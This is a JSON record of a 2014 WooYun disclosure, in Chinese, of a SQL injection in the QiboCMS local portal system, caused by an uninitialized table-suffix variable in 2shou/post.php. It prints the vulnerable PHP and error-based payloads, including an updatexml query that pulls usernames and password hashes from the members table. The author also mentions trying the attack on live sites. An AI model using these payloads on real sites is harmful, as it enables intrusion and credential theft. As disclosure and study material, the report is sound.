{"id": 41844, "wybug_id": "wooyun-2014-087510", "wybug_title": "齐博地方门户系统sql注入", "wybug_corp": "齐博CMS", "wybug_author": "Power", "wybug_date": "2014-12-18 14:43", "wybug_open_date": "2015-04-02 10:23", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-23：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-02：\t细节向公众公开  简要描述： 变量未初始化导致注入 详细说明：  齐博地方门户系统齐博的全局过滤系统中由于存在如下代码，导致传入的参数可以成为全局变量\nforeach($_COOKIE AS $_key=>$_value){\tunset($$_key);}foreach($_POST AS $_key=>$_value){\t!ereg(\"^\\_[A-Z]+\",$_key) && $$_key=$_POST[$_key];}foreach($_GET AS $_key=>$_value){\t!ereg(\"^\\_[A-Z]+\",$_key) && $$_key=$_GET[$_key];}\n所以系统中如果存在未初始化的变量，容易导致注入2shou/post.php中180行\n$postdb['list']=$timestamp;\tif($iftop){\t\t//推荐置顶\t\t@extract($db->get_one(\"SELECT COUNT(*) AS NUM FROM `{$_pre}content$_erp` WHERE list>'$timestamp' AND fid='$fid' AND city_id='$postdb[city_id]'\"));  //此处_erp未初始化\t\tif($webdb[Info_TopNum]&&$NUM>=$webdb[Info_TopNum]){\t\t\tshowerr(\"当前栏目置顶信息已达到上限!\");\t\t}\t\t$postdb['list']+=3600*24*$webdb[Info_TopDay];\t\tif($lfjdb[money]<$webdb[Info_TopMoney]){\t\t\tshowerr(\"你的积分不足:$webdb[Info_TopMoney],不能选择置顶\");\t\t}\t\t$lfjdb[money]=$lfjdb[money]-$webdb[Info_TopMoney];\t//为下面焦点信息做判断积分是否足够\t}\n这个地方还有点问题，我本地测试用常规的报错语句没问题，如下\nand exists(select*from (select*from(select name_const(@@version,0))a join (select name_const(@@version,0))b)c)\n但是网上测试时，总是提示Incorrect arguments to NAME_CONST，好像是版本过低。网上没有找到解决方案，最后根据这个语句自己构造了一个，好象是没有版本限制噢。这个语句在这个地方不能够自由控制报错的表，所以自我感觉没啥大用处，限制条件还是12个字符\nSELECT 1 FROM dede_admin WHERE updatexml(1,(SELECT CONCAT(0x5b,uname,0x3a,MID(pwd,4,16),0x5d) FROM dede_admin),1);\n构造如下\nwhere (SELECT 1 FROM qb_members WHERE updatexml(1,(SELECT CONCAT(0x5b,username,0x3a,MID(password,4,16),0x5d) FROM qb_members limit 0,1),1))\n用的时候自己修改就ok 了，不知道网上有没有。这个地方有个积分计算，其实不用担心，因为在计算积分之前，程序已经注入完成。由于这个地方提交表单时是 multipart/form-data 方式，起初一直想着怎么post 过去_erp这个参数，后来才发现根本就不需要post 直接get 就ok 了，也省去了去处理 multipart/form-data 方式提交数据构造。   漏洞证明：  首先注册会员，然后发布消息。\n\n选择置顶消息(此处是让程序进入if($iftop)中，其实改下提交iftop这个参数就ok.)截断构造数据,用/**/替换空格,mysql版本低的时候可以用这个\n\n出数据mysql版本高的时候用这个。\n\n出数据如下\n\n找几个网上的案例如下。\n\n\n\n   修复方案：  ...   版权声明：转载请注明来源 Power@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-04-02 10:23 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}